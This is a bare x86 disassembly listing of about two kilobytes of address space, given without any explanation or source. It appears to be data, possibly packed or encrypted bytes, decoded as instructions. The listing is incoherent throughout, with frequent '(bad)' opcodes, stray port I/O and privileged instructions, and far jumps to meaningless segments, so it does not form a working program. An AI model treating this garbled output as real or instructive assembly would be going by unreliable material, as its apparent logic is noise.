  41364d:	and    al,0x4e
  41364f:	int3   
  413650:	adc    DWORD PTR [eax],edx
  413652:	mov    bh,0xe9
  413654:	clc    
  413655:	mov    BYTE PTR [edx+0x68396bc7],dh
  41365b:	mov    ebp,0x6c380bd6
  413660:	dec    edi
  413661:	shl    DWORD PTR [edx],1
  413663:	mov    ah,0x93
  413665:	int3   
  413666:	das    
  413667:	mov    bl,0xb8
  413669:	mov    eax,ds:0x400c0a14
  41366e:	aad    0xba
  413670:	cmp    al,0x79
  413672:	popf   
  413673:	in     al,dx
  413674:	aam    0xdd
  413676:	retf   0xb342
  413679:	ja     0x413690
  41367b:	iret   
  41367c:	ja     0x4136ae
  41367e:	lds    edx,FWORD PTR [ecx+0x2282093b]
  413684:	rcr    edi,0x61
  413687:	adc    bl,dl
  413689:	sbb    dl,BYTE PTR [edi]
  41368b:	je     0x4136b2
  41368d:	test   DWORD PTR [ebp+0x14],ebx
  413690:	push   ebx
  413691:	push   ss
  413692:	inc    ecx
  413693:	push   ds
  413694:	pop    ebp
  413695:	jecxz  0x4136ca
  413697:	and    BYTE PTR [ecx+0x65],0x55
  41369b:	hlt    
  41369c:	(bad)  
  41369d:	dec    edi
  41369e:	aas    
  41369f:	stc    
  4136a0:	jnp    0x413639
  4136a2:	mov    ebp,0x526aaa9f
  4136a7:	cdq    
  4136a8:	in     al,dx
  4136a9:	lock xchg ecx,eax
  4136ab:	clc    
  4136ac:	jmp    0x41363d
  4136ae:	inc    esi
  4136af:	inc    edx
  4136b0:	mov    dh,0xe2
  4136b2:	pusha  
  4136b3:	daa    
  4136b4:	cmp    ah,BYTE PTR [ebp+0x5]
  4136b7:	pushf  
  4136b8:	icebp  
  4136b9:	mov    eax,0x52f17628
  4136be:	mov    esp,0x182011c1
  4136c3:	scas   al,BYTE PTR es:[edi]
  4136c4:	out    0xdd,eax
  4136c6:	sahf   
  4136c7:	mov    eax,ds:0x324f9a1c
  4136cc:	adc    al,0xa4
  4136ce:	imul   edx,DWORD PTR [eax+0xe],0x83d2de88
  4136d5:	jb     0x41370b
  4136d7:	ret    
  4136d8:	mov    al,ds:0xfd609bc4
  4136dd:	add    DWORD PTR [ebp+0x5],edi
  4136e0:	and    BYTE PTR [edi+0x33],dl
  4136e3:	cmp    edx,ebx
  4136e5:	jle    0x413715
  4136e7:	inc    ecx
  4136e8:	fnstenv ds:0x9b139bd0
  4136ee:	xchg   edx,eax
  4136ef:	mov    ah,0x14
  4136f1:	(bad)  
  4136f2:	rcr    BYTE PTR ds:0x49fd8395,1
  4136f8:	jp     0x413735
  4136fa:	mov    bl,0x82
  4136fc:	and    esp,eax
  4136fe:	mov    fs,ecx
  413700:	mov    bh,0x1c
  413702:	int3   
  413703:	jle    0x4136ce
  413705:	jmp    0x3065:0x611079c1
  41370c:	mov    edi,0xdd0e526c
  413711:	push   0xffffff8f
  413713:	xlat   BYTE PTR ds:[ebx]
  413714:	sub    al,0x97
  413716:	xor    esi,DWORD PTR [ebx-0x73f6e26]
  41371c:	adc    ebp,DWORD PTR [esi+0x40]
  41371f:	arpl   WORD PTR [edi+0x73d5d455],bx
  413725:	(bad)  
  413726:	fwait
  413727:	and    BYTE PTR [eax-0x51],ch
  41372a:	dec    ecx
  41372b:	dec    esp
  41372c:	push   cs
  41372d:	sahf   
  41372e:	call   0x87996778
  413733:	add    BYTE PTR [esi+0x2d],bh
  413736:	jno    0x413729
  413738:	jmp    0x4137ae
  41373a:	dec    eax
  41373b:	push   esp
  41373c:	pop    ds
  41373d:	add    edx,DWORD PTR [esi+0x10]
  413740:	pop    ecx
  413741:	inc    edi
  413742:	adc    al,0xb0
  413744:	pusha  
  413745:	inc    esi
  413746:	ins    BYTE PTR es:[edi],dx
  413747:	shl    edx,1
  413749:	pop    edi
  41374a:	dec    eax
  41374b:	cmp    esi,DWORD PTR [esi]
  41374d:	das    
  41374e:	cs push ebx
  413750:	mov    dh,0xc8
  413752:	mov    ds:0xbcaac4c8,al
  413758:	stos   BYTE PTR es:[edi],al
  413759:	dec    ebx
  41375a:	pop    ecx
  41375b:	mov    DWORD PTR [ebx+0x586c9cec],ebx
  413761:	pushf  
  413762:	sti    
  413763:	(bad)  
  413764:	jmp    0x41370c
  413766:	sbb    esp,DWORD PTR [esi+0x5a]
  413769:	pop    esi
  41376a:	arpl   WORD PTR [ecx+0x6c],ax
  41376d:	inc    ebp
  41376e:	ror    BYTE PTR [esi+0x60],1
  413771:	(bad)  
  413772:	or     bl,BYTE PTR [esi-0x4a667556]
  413778:	inc    ebx
  413779:	retf   0xb932
  41377c:	dec    ecx
  41377d:	popf   
  41377e:	(bad)  [esi]
  413780:	or     ebx,edx
  413782:	and    ebp,DWORD PTR [edx-0x66cf412]
  413788:	push   eax
  413789:	xchg   ebp,eax
  41378a:	sbb    esp,DWORD PTR [esi+eax*4-0xa]
  41378e:	pop    edx
  41378f:	repz inc ecx
  413791:	push   ecx
  413792:	pop    eax
  413793:	out    dx,eax
  413794:	retf   0x40ed
  413797:	test   eax,0x9e576473
  41379c:	push   0x72
  41379e:	nop
  41379f:	scas   eax,DWORD PTR es:[edi]
  4137a0:	add    DWORD PTR [ebx+eax*8],esp
  4137a3:	aam    0x6a
  4137a5:	outs   dx,DWORD PTR ds:[esi]
  4137a6:	mov    WORD PTR [ebx-0x20],?
  4137a9:	pushf  
  4137aa:	xchg   eax,ecx
  4137ac:	rol    DWORD PTR [ecx],1
  4137ae:	pop    ecx
  4137af:	fstp   QWORD PTR [ebx-0x9e7c06d]
  4137b5:	adc    esp,esi
  4137b7:	and    dl,bh
  4137b9:	push   esi
  4137ba:	inc    ebx
  4137bb:	cs popf 
  4137bd:	mov    eax,0xbd07bfdd
  4137c2:	xor    edx,edi
  4137c4:	sub    eax,0x50ac4d4e
  4137c9:	out    0x9,al
  4137cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137cc:	loopne 0x413794
  4137ce:	out    0xfa,al
  4137d0:	and    bl,BYTE PTR [ecx]
  4137d2:	cmp    al,0xda
  4137d4:	cdq    
  4137d5:	and    esp,DWORD PTR [ebx+0x1abe4e59]
  4137db:	jmp    DWORD PTR [eax+0x1c40d36d]
  4137e1:	(bad)  
  4137e2:	xlat   BYTE PTR ds:[ebx]
  4137e3:	enter  0x17e7,0x50
  4137e7:	adc    BYTE PTR [eax],bl
  4137e9:	mov    bh,0x9d
  4137eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137ec:	adc    esi,eax
  4137ee:	in     al,dx
  4137ef:	add    eax,edi
  4137f1:	mov    eax,0xe3cad692
  4137f6:	jb     0x4137b4
  4137f8:	xchg   ebp,eax
  4137f9:	adc    esp,edi
  4137fb:	and    BYTE PTR [ebx],ah
  4137fd:	jle    0x413782
  4137ff:	test   al,0x70
  413801:	test   eax,0xaeedafce
  413806:	cmp    eax,0x49f2f8cd
  41380b:	or     edx,DWORD PTR [edx-0x56]
  41380e:	push   ebx
  41380f:	sbb    cl,al
  413811:	jecxz  0x413864
  413813:	inc    esi
  413814:	sub    ebp,DWORD PTR [edx+0x66]
  413817:	mov    eax,ds:0x7742803c
  41381c:	arpl   WORD PTR [eax],di
  41381e:	jne    0x4137ca
  413820:	add    al,0xd3
  413822:	and    ch,al
  413824:	adc    BYTE PTR [edx],ah
  413826:	enter  0x9afd,0xcb
  41382a:	cld    
  41382b:	jns    0x4137eb
  41382d:	cmp    DWORD PTR [edi-0x55],eax
  413830:	out    dx,al
  413831:	adc    dl,BYTE PTR [edx]
  413833:	fwait
  413834:	aaa    
  413835:	sar    DWORD PTR [edx+0x1c],cl
  413838:	aaa    
  413839:	jmp    0xd279ca9a
  41383e:	rol    edi,1
  413840:	out    0xcb,al
  413842:	inc    edi
  413843:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413844:	or     esp,DWORD PTR [ecx-0x2ae68031]
  41384a:	push   ecx
  41384b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41384c:	mov    al,ds:0x4481dcae
  413851:	dec    ecx
  413852:	jns    0x4138a9
  413854:	in     al,dx
  413855:	push   eax
  413856:	test   eax,0x6acf3986
  41385b:	mov    bh,0x63
  41385d:	xor    dh,BYTE PTR [ecx+0x77]
  413860:	mov    eax,0x21a681fb
  413865:	fadd   QWORD PTR [edi]
  413867:	inc    esp
  413868:	frstor [edi+eax*2-0x13]
  41386c:	adc    esi,edx
  41386e:	mov    eax,0x1bab9ae8
  413873:	repz in eax,0x21
  413876:	and    BYTE PTR [esi+0x47012d93],0x7e
  41387d:	jno    0x413874
  41387f:	scas   eax,DWORD PTR es:[edi]
  413880:	cmp    ecx,DWORD PTR [ecx-0x33c29100]
  413886:	leave  
  413887:	pusha  
  413888:	mov    ebp,0xa5ad58cc
  41388d:	dec    ebp
  41388e:	lock dec ebx
  413890:	sbb    DWORD PTR [ebx+0x7f4214ee],ebx
  413896:	stos   BYTE PTR es:[edi],al
  413897:	imul   edx,DWORD PTR [ebx],0x59bbd13c
  41389d:	(bad)  
  41389e:	(bad)  
  4138a0:	inc    esi
  4138a1:	pop    ebx
  4138a2:	push   esp
  4138a3:	add    BYTE PTR [eax-0x7396f526],ch
  4138a9:	mov    ah,0x94
  4138ab:	test   al,0x9e
  4138ad:	mov    ecx,0x477def4e
  4138b2:	call   0xc80e497f
  4138b7:	daa    
  4138b8:	lods   al,BYTE PTR ds:[esi]
  4138b9:	add    ah,BYTE PTR [ecx+edi*1+0x7a]
  4138bd:	xchg   ecx,eax
  4138be:	in     eax,0xf5
  4138c0:	mov    ecx,0x71716e81
  4138c5:	cdq    
  4138c6:	aam    0x13
  4138c8:	retf   
  4138c9:	push   ebp
  4138ca:	pop    ebp
  4138cb:	ins    BYTE PTR es:[edi],dx
  4138cc:	stos   BYTE PTR es:[edi],al
  4138cd:	push   ebp
  4138ce:	or     DWORD PTR [ecx+edx*4],edx
  4138d1:	ja     0x4138dd
  4138d3:	mov    bh,0x0
  4138d5:	cmp    DWORD PTR [ebx-0x1eecf29d],edi
  4138db:	(bad)  
  4138dc:	mov    ebx,0xf0df4168
  4138e1:	push   0xffffffbf
  4138e3:	int    0xd
  4138e5:	pop    edi
  4138e6:	mov    ds:0x3516ab4,eax
  4138eb:	mov    bh,0xd0
  4138ed:	dec    ebx
  4138ee:	mov    ds:0xc67bb461,al
  4138f3:	pusha  
  4138f4:	jp     0x41390c
  4138f6:	push   esi
  4138f7:	xor    BYTE PTR [ebx+0x30],bl
  4138fa:	cwde   
  4138fb:	or     eax,0x711d3806
  413900:	lea    edx,[edx+ebp*2]
  413903:	in     eax,dx
  413904:	mov    bl,BYTE PTR [eax+0x5c02038a]
  41390a:	rcr    BYTE PTR [edx-0x664bc162],cl
  413910:	enter  0xa56b,0xdb
  413914:	push   ss
  413915:	dec    ebp
  413916:	pushf  
  413917:	mov    dh,0xa9
  413919:	mov    dl,0xaf
  41391b:	push   eax
  41391c:	mov    ch,0x69
  41391e:	fnstcw WORD PTR [edi-0x40]
  413921:	iret   
  413922:	push   0xffffffed
  413924:	fmul   QWORD PTR [ebx]
  413926:	ret    0x3bfd
  413929:	fadd   DWORD PTR [eax-0x95c4c9e]
  41392f:	sub    BYTE PTR [ecx],dh
  413931:	imul   edx
  413933:	fwait
  413934:	adc    bh,cl
  413936:	push   edi
  413937:	dec    ecx
  413938:	cwde   
  413939:	pop    ebp
  41393a:	xor    al,0xa2
  41393c:	lea    esp,[edx]
  41393e:	adc    eax,0x6d92b1e5
  413943:	outs   dx,DWORD PTR ds:[esi]
  413944:	ret    0x1f98
  413947:	adc    BYTE PTR [edi-0x62de4b07],0x30
  41394e:	xchg   BYTE PTR [edi],bh
  413950:	and    DWORD PTR [ecx],esp
  413952:	cmp    eax,0x25a22d5f
  413957:	lea    esi,[ebx-0x1924f9ab]
  41395d:	jns    0x23e856f7
  413963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413964:	jbe    0x413949
  413966:	mov    ch,0xf8
  413968:	push   0xa076f5c5
  41396d:	add    dl,bh
  41396f:	loopne 0x41395f
  413971:	dec    edx
  413972:	aad    0x14
  413974:	test   eax,0xfff20c78
  413979:	cdq    
  41397a:	xchg   esi,eax
  41397b:	sub    DWORD PTR [ebx],ebx
  41397d:	inc    ebp
  41397e:	sahf   
  41397f:	(bad)  
  413980:	ins    DWORD PTR es:[edi],dx
  413981:	xchg   DWORD PTR [edx-0x1c92047f],edi
  413987:	jecxz  0x413945
  413989:	xchg   edi,eax
  41398a:	pusha  
  41398b:	xchg   ebp,eax
  41398c:	push   es
  41398d:	stos   DWORD PTR es:[edi],eax
  41398e:	shr    DWORD PTR [ebx-0x32],0x5c
  413992:	jo     0x413986
  413994:	sar    BYTE PTR [esi-0x63c97a33],0x91
  41399b:	or     edx,DWORD PTR [ebp+0x2c]
  41399e:	xlat   BYTE PTR ds:[ebx]
  41399f:	ds pop ecx
  4139a1:	mov    ds:0x12358b5c,eax
  4139a6:	mov    esp,0xfd356ae
  4139ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139ac:	arpl   si,si
  4139ae:	js     0x413980
  4139b0:	mul    BYTE PTR [edx]
  4139b2:	neg    DWORD PTR [ebx+0x15]
  4139b5:	(bad)  
  4139b6:	mov    dl,ch
  4139b8:	jnp    0x413a1f
  4139ba:	cli    
  4139bb:	aad    0x95
  4139bd:	(bad)  
  4139be:	cmc    
  4139bf:	and    al,0x25
  4139c1:	and    cl,BYTE PTR [ebx+0x40c8c9a]
  4139c7:	or     bl,bl
  4139c9:	mov    DWORD PTR [edx-0x1],ecx
  4139cc:	push   cs
  4139cd:	cmp    al,0x46
  4139cf:	push   es
  4139d0:	leave  
  4139d1:	imul   esp,DWORD PTR [esp+ebp*1],0x1fcd412c
  4139d8:	popf   
  4139d9:	sbb    al,BYTE PTR [esi-0x1a9d2d9]
  4139df:	lea    esp,[esi-0x2d5ded24]
  4139e5:	(bad)  
  4139e6:	(bad)  
  4139e7:	jmp    0x4139a5
  4139e9:	hlt    
  4139ea:	les    ebx,FWORD PTR [esi-0x70]
  4139ed:	(bad)  
  4139ee:	outs   dx,DWORD PTR ds:[esi]
  4139ef:	ja     0x413989
  4139f1:	xchg   ebx,eax
  4139f2:	xor    DWORD PTR [edi-0x5b9c14b0],edx
  4139f8:	mov    esp,0x3e385bb7
  4139fd:	mov    DWORD PTR [eax],edi
  4139ff:	xor    ebx,DWORD PTR ds:0xc30fd1fc
  413a05:	push   cs
  413a06:	sahf   
  413a07:	adc    eax,0xc78db164
  413a0c:	enter  0x4b8d,0xc7
  413a10:	jl     0x413a5a
  413a12:	add    al,0x79
  413a14:	call   0xf064:0xc74bd4bb
  413a1b:	ins    DWORD PTR es:[edi],dx
  413a1c:	mov    edi,0x609c0214
  413a21:	xchg   ecx,eax
  413a22:	inc    edi
  413a23:	ror    DWORD PTR [ebx],0x15
  413a26:	nop
  413a27:	mov    ebx,DWORD PTR [ebx+ecx*2]
  413a2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a2b:	cs add eax,0xe4333c39
  413a31:	mov    eax,ds:0x939a88e4
  413a36:	ror    DWORD PTR [ebx-0x40],0xcf
  413a3a:	in     al,dx
  413a3b:	sbb    al,0x64
  413a3d:	and    ebx,ebx
  413a3f:	(bad)  
  413a40:	sub    al,0x18
  413a42:	or     esp,ebx
  413a44:	mov    dl,BYTE PTR [esi]
  413a46:	shl    BYTE PTR [ecx-0x6d6d1c0d],0x63
  413a4d:	cli    
  413a4e:	or     esp,DWORD PTR [ecx+0x72]
  413a51:	in     eax,dx
  413a52:	pop    eax
  413a53:	ds fs test esi,ebx
  413a57:	rcr    DWORD PTR [ebp+eiz*1-0x12f80b0e],cl
  413a5e:	dec    esp
  413a5f:	(bad)  [ecx+0x7d]
  413a62:	clc    
  413a63:	data16 js 0x413a10
  413a66:	dec    BYTE PTR [ebp-0x34]
  413a69:	ss push esi
  413a6b:	add    eax,0x24cd3c02
  413a70:	mov    ss,WORD PTR [edi]
  413a72:	imul   ebp,eax,0x8177ac49
  413a78:	mov    bh,0x1e
  413a7a:	push   ss
  413a7b:	push   edi
  413a7c:	cmc    
  413a7d:	jbe    0x413a6b
  413a7f:	mov    edi,0xfc07495a
  413a84:	(bad)  
  413a85:	loop   0x413a6e
  413a87:	push   edx
  413a88:	fmul   QWORD PTR [edi-0x69]
  413a8b:	pusha  
  413a8c:	dec    eax
  413a8d:	push   eax
  413a8e:	mov    ebx,0x9c6b5064
  413a93:	xchg   ebp,eax
  413a94:	jb     0x413a99
  413a96:	sub    DWORD PTR [ebx+0xa],edi
  413a99:	jne    0x413ae6
  413a9b:	inc    ecx
  413a9c:	(bad)  [ecx]
  413a9e:	out    dx,eax
  413a9f:	jmp    0x9937b284
  413aa4:	sbb    edx,DWORD PTR [ebp-0x6f]
  413aa7:	jbe    0x413a8f
  413aa9:	imul   BYTE PTR [eax+0x69335611]
  413aaf:	or     dl,BYTE PTR [ecx-0x8]
  413ab2:	jae    0x413a5b
  413ab4:	inc    esp
  413ab5:	pandn  mm1,QWORD PTR [eax-0x334a0f87]
  413abc:	dec    ebx
  413abd:	enter  0x8f97,0xc7
  413ac1:	adc    BYTE PTR [ecx+0x40e8115e],0xbd
  413ac8:	loopne 0x413a67
  413aca:	and    DWORD PTR [esi],edi
  413acc:	xor    esp,DWORD PTR [esi+0x9f5eb8a]
  413ad2:	call   0x991a:0x575a1686
  413ad9:	add    eax,0xa7989fa0
  413ade:	sub    esp,esi
  413ae0:	outs   dx,BYTE PTR ds:[esi]
  413ae1:	js     0x413a7a
  413ae3:	test   eax,0x137aebc4
  413ae8:	jne    0x413b41
  413aea:	loope  0x413ac3
  413aec:	sub    DWORD PTR [edx-0x29],esp
  413aef:	xchg   edx,eax
  413af0:	sbb    ebp,eax
  413af2:	sbb    eax,0xf145c140
  413af7:	sub    ah,bh
  413af9:	jb     0x413b07
  413afb:	sahf   
  413afc:	cmp    al,dh
  413afe:	std    
  413aff:	jne    0x413b77
  413b01:	shr    bh,1
  413b03:	sahf   
  413b04:	imul   ebx,DWORD PTR [edx+0x1bf656da],0x484caef
  413b0e:	leave  
  413b0f:	adc    al,0xc9
  413b11:	mov    ds:0xf60a5467,eax
  413b16:	sub    eax,0x22273930
  413b1b:	ins    BYTE PTR es:[edi],dx
  413b1c:	jmp    0x413b51
  413b1e:	pushf  
  413b1f:	jbe    0x413b52
  413b21:	retf   0x199
  413b24:	iret   
  413b25:	out    0xc7,al
  413b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b28:	or     DWORD PTR [ebx+edi*8+0x60abc792],esi
  413b2f:	mov    al,ds:0x3abf71a7
  413b34:	pop    esi
  413b35:	mov    eax,ds:0xe7f7b88e
  413b3a:	mov    esi,0x749005dc
  413b3f:	mov    esi,ecx
  413b41:	add    eax,0xbfd3666
  413b46:	sti    
  413b47:	or     BYTE PTR [ecx],0xf7
  413b4a:	xor    eax,0x357517f3
  413b4f:	or     bh,bh
  413b51:	jno    0x413b56
  413b53:	pop    ebx
  413b54:	mov    ds:0x9acb3fc5,al
  413b59:	in     al,0xe8
  413b5b:	lahf   
  413b5c:	xor    al,0xa5
  413b5e:	xchg   ebx,eax
  413b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b60:	jl     0x413ae4
  413b62:	popf   
  413b63:	dec    eax
  413b64:	add    eax,0xcb9adde6
  413b69:	pop    edi
  413b6a:	jg     0x413b9d
  413b6c:	jb     0x413b6f
  413b6e:	jne    0x413b73
  413b70:	mov    dl,0x84
  413b72:	addr16 pop ss
  413b74:	mov    dl,0x1b
  413b76:	shl    edi,1
  413b78:	jno    0x413bbc
  413b7a:	mov    al,ds:0x4e58ac10
  413b7f:	cdq    
  413b80:	js     0x413b8e
  413b82:	pop    eax
  413b83:	mov    WORD PTR [edi],ds
  413b85:	fcomp  DWORD PTR [ecx+eax*2]
  413b88:	pushf  
  413b89:	xlat   BYTE PTR ds:[ebx]
  413b8a:	out    0xa8,al
  413b8c:	lock test eax,0xebfe56c3
  413b93:	mov    al,ds:0x5c6e06a3
  413b98:	push   cs
  413b99:	fstp   TBYTE PTR [ecx-0x38bd6666]
  413b9f:	push   ss
  413ba0:	sbb    al,0xa5
  413ba2:	(bad)  
  413ba3:	loop   0x413bff
  413ba5:	cmp    ch,dh
  413ba7:	push   ecx
  413ba8:	sub    al,0xda
  413baa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bab:	scas   al,BYTE PTR es:[edi]
  413bac:	mov    esi,0x7a6be50f
  413bb1:	pop    edx
  413bb2:	sub    BYTE PTR [esi+ecx*2],bh
  413bb5:	xor    DWORD PTR [eax],ebx
  413bb7:	jnp    0x413b89
  413bb9:	or     DWORD PTR [eax+0x43],0xffffff8b
  413bbd:	or     al,0xb1
  413bbf:	in     al,dx
  413bc0:	cmc    
  413bc1:	iret   
  413bc2:	sbb    al,0x74
  413bc4:	inc    edi
  413bc5:	(bad)  
  413bc6:	adc    BYTE PTR [ebp+0x45],bh
  413bc9:	enter  0xa6a8,0x2e
  413bcd:	cli    
  413bce:	cmp    DWORD PTR [ebp-0x22f4c5a8],ecx
  413bd4:	dec    esi
  413bd5:	shl    BYTE PTR [eax],0xa5
  413bd8:	inc    esi
  413bd9:	cmp    dh,BYTE PTR [eax]
  413bdb:	adc    ch,BYTE PTR [ebx-0x28d836ef]
  413be1:	shl    ah,cl
  413be3:	xchg   dx,ax
  413be5:	outs   dx,BYTE PTR ds:[esi]
  413be6:	lods   al,BYTE PTR ds:[esi]
  413be7:	jl     0x413c14
  413be9:	xchg   edi,eax
  413bea:	std    
  413beb:	push   edi
  413bec:	mov    dl,0x22
  413bee:	or     BYTE PTR [eax],al
  413bf0:	or     BYTE PTR [ecx],ch
  413bf2:	push   ds
  413bf3:	ror    BYTE PTR [edx],cl
  413bf5:	push   edi
  413bf6:	js     0x413c72
  413bf8:	loope  0x413c0b
  413bfa:	adc    esi,DWORD PTR [edx+0x6a35fbaf]
  413c00:	add    eax,0x8775fcf3
  413c05:	outs   dx,DWORD PTR ds:[esi]
  413c06:	inc    ebp
  413c07:	xor    BYTE PTR [esi-0x524ba229],bh
  413c0d:	mov    WORD PTR [esi-0x22],ds
  413c10:	hlt    
  413c11:	sbb    BYTE PTR [ecx+0x2a6da4cf],ah
  413c17:	push   edx
  413c18:	aam    0x89
  413c1a:	xchg   esi,eax
  413c1b:	xchg   ebp,eax
  413c1c:	adc    eax,0x145ba805
  413c21:	sahf   
  413c22:	icebp  
  413c23:	mov    bh,0xf9
  413c25:	xor    eax,0x62505f00
  413c2a:	fcomip st,st(2)
  413c2c:	dec    edx
  413c2d:	mov    cl,0xa2
  413c2f:	test   eax,0xf8b7e127
  413c34:	xor    eax,0x3bd011b
  413c39:	jnp    0x413c5d
  413c3b:	lds    ecx,FWORD PTR [edi]
  413c3d:	xchg   ebx,eax
  413c3e:	in     al,dx
  413c3f:	pop    ss
  413c40:	xor    eax,0x2ff7415c
  413c45:	sbb    BYTE PTR [edi+0x6a],0x71
  413c49:	inc    edx
  413c4a:	xor    eax,0xf5d5e0f5
  413c4f:	data16 out 0xe9,al
  413c52:	mov    edi,0x6c621404
  413c57:	jmp    FWORD PTR [ebx]
  413c59:	add    esi,DWORD PTR [ebx]
  413c5b:	sub    al,0x5b
  413c5d:	xor    BYTE PTR [edi],al
  413c5f:	xchg   edi,eax
  413c60:	imul   edi,esi,0x9f48ceb3
  413c66:	adc    al,0x66
  413c68:	sbb    bl,BYTE PTR [ebx+0x5b]
  413c6b:	jmp    0x413c3e
  413c6d:	loop   0x413cd5
  413c6f:	(bad)  
  413c70:	jcxz   0x413bfd
  413c73:	pop    ebp
  413c74:	or     esp,edx
  413c76:	fdivr  DWORD PTR [esi-0x47af644b]
  413c7c:	push   ebp
  413c7d:	in     al,dx
  413c7e:	test   eax,0x5cb499a9
  413c83:	xlat   BYTE PTR ds:[ebx]
  413c84:	push   edi
  413c86:	in     al,0xae
  413c88:	daa    
  413c89:	stc    
  413c8a:	clc    
  413c8b:	or     al,0xfe
  413c8d:	les    ecx,FWORD PTR [eax-0x5cd74960]
  413c93:	sbb    dh,ah
  413c95:	sbb    esi,0xffffffa4
  413c98:	adc    bl,BYTE PTR [edi+0x49]
  413c9b:	xchg   esi,eax
  413c9c:	or     BYTE PTR [eax-0x4e],bh
  413c9f:	(bad)  
  413ca0:	cmp    al,0x73
  413ca2:	(bad)  
  413ca3:	stc    
  413ca4:	jle    0x413cc8
  413ca6:	pop    ebx
  413ca7:	xchg   esi,eax
  413ca8:	or     eax,0x4c08d320
  413cad:	sti    
  413cae:	lahf   
  413caf:	inc    BYTE PTR [esi]
  413cb1:	in     al,dx
  413cb2:	shl    BYTE PTR [eax+0x5f],cl
  413cb5:	sbb    edx,esi
  413cb7:	and    esp,DWORD PTR [eax]
  413cb9:	inc    edx
  413cba:	out    dx,eax
  413cbb:	jmp    0xedff:0xf3bb424f
  413cc2:	push   eax
  413cc3:	sub    eax,0xa3a7170e
  413cc8:	pop    esp
  413cc9:	sub    BYTE PTR [esi-0x27],dh
  413ccc:	arpl   WORD PTR [edx+0x2c],di
  413ccf:	jnp    0x413ce3
  413cd1:	add    al,0x48
  413cd3:	fs push eax
  413cd5:	push   esp
  413cd6:	and    al,0xa4
  413cd8:	mov    al,0x0
  413cda:	cmp    ecx,esi
  413cdc:	xchg   ebp,eax
  413cdd:	adc    BYTE PTR [ecx-0x77],0x61
  413ce1:	ins    BYTE PTR es:[edi],dx
  413ce2:	and    al,BYTE PTR [ebx+0xc0df1e0]
  413ce8:	mov    ds:0x20eb88d6,eax
  413ced:	dec    eax
  413cee:	(bad)  
  413cef:	hlt    
  413cf0:	rcr    BYTE PTR [ecx],cl
  413cf2:	aad    0x6f
  413cf4:	sahf   
  413cf5:	sbb    eax,0x84c09f8e
  413cfa:	adc    eax,ecx
  413cfc:	jecxz  0x413d09
  413cfe:	or     edi,DWORD PTR [esi-0x28119c10]
  413d04:	add    BYTE PTR [ebp+0x13],dh
  413d07:	nop
  413d08:	and    cl,BYTE PTR [eax-0x72640cd4]
  413d0e:	jcxz   0x413caa
  413d11:	into   
  413d12:	xchg   BYTE PTR [ecx+edx*4],ah
  413d15:	das    
  413d16:	xlat   BYTE PTR ds:[ebx]
  413d17:	int3   
  413d18:	clc    
  413d19:	xor    esp,DWORD PTR [ebx+0x655f030b]
  413d1f:	iret   
  413d20:	pop    esi
  413d21:	jo     0x413cf3
  413d23:	fs mov dh,ah
  413d26:	lods   al,BYTE PTR ds:[esi]
  413d27:	sub    al,0xba
  413d29:	icebp  
  413d2a:	xor    ebx,DWORD PTR [ebp-0x4264084f]
  413d30:	repz cmp bh,BYTE PTR [edi+0x5a1b8b52]
  413d37:	fsub   DWORD PTR [ecx-0xc133b9a]
  413d3d:	pusha  
  413d3e:	lea    esp,[ebx]
  413d40:	(bad)  [edi]
  413d42:	fwait
  413d43:	pop    DWORD PTR [esi+0x62]
  413d46:	popa   
  413d47:	ins    BYTE PTR es:[edi],dx
  413d48:	pushf  
  413d49:	mov    bh,0xfa
  413d4b:	lea    esp,[edx+ebx*2-0x3b]
  413d4f:	xchg   BYTE PTR [edx-0x173dd86d],dh
  413d55:	nop
  413d56:	clc    
  413d57:	mov    WORD PTR [ebp+0x17],cs
  413d5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d5b:	ret    0x9c25
  413d5e:	loop   0x413d3a
  413d60:	mov    eax,ds:0x86abbcb0
  413d65:	fcmove st,st(1)
  413d67:	sub    edi,esp
  413d69:	xchg   ecx,eax
  413d6a:	in     al,dx
  413d6b:	jp     0x413dc4
  413d6d:	mov    es,WORD PTR [eax]
  413d6f:	in     eax,dx
  413d70:	loopne 0x413d4e
  413d72:	jb     0x413d9c
  413d74:	sbb    BYTE PTR [edi-0x2b920474],0xa4
  413d7b:	push   edi
  413d7c:	mov    cl,0x8d
  413d7e:	(bad)  
  413d7f:	add    al,dh
  413d81:	sar    DWORD PTR [ebx],1
  413d83:	push   ebx
  413d84:	jo     0x413d43
  413d86:	push   esi
  413d87:	mov    BYTE PTR [esi],0x9b
  413d8a:	jno    0x413d44
  413d8c:	and    al,BYTE PTR [ebx+ebx*8-0x5f3cee23]
  413d93:	sbb    al,0x16
  413d95:	pop    edi
  413d96:	sbb    DWORD PTR ds:0x454c42c5,esp
  413d9c:	dec    ecx
  413d9d:	jg     0x413d77
  413d9f:	lea    ebx,[ecx-0x22]
  413da2:	ffree  st(0)
  413da4:	jns    0x413e23
  413da6:	dec    edx
  413da7:	xchg   ebp,eax
  413da8:	dec    edx
  413da9:	in     eax,0x7a
  413dab:	cmp    ah,BYTE PTR ds:0x393ce7ac
  413db1:	or     eax,0x8560d843
  413db6:	inc    esi
  413db7:	arpl   di,bx
  413db9:	sbb    eax,0xc15b01ed
  413dbe:	dec    esp
  413dbf:	sti    
  413dc0:	jne    0x413daf
  413dc2:	inc    eax
  413dc3:	pop    ebx
  413dc4:	sub    eax,0xea04dbff
  413dca:	dec    eax
  413dcb:	js     0x413d58
  413dcd:	sbb    edx,DWORD PTR [ebp+0x93c2156]
  413dd3:	pop    edx
  413dd4:	xor    al,0xa5
  413dd6:	adc    BYTE PTR [ebx],ch
  413dd8:	dec    ebp
  413dd9:	xchg   ebp,eax
  413dda:	nop
  413ddb:	stos   BYTE PTR es:[edi],al
  413ddc:	sbb    DWORD PTR ds:0x4306ce8e,ebx
  413de2:	mov    esp,0xf534dd19
  413de7:	jmp    0x413dd4
  413de9:	loop   0x413d6b
  413deb:	cmp    al,0x26
  413ded:	xchg   BYTE PTR [esi-0x51],ah
  413df0:	aaa    
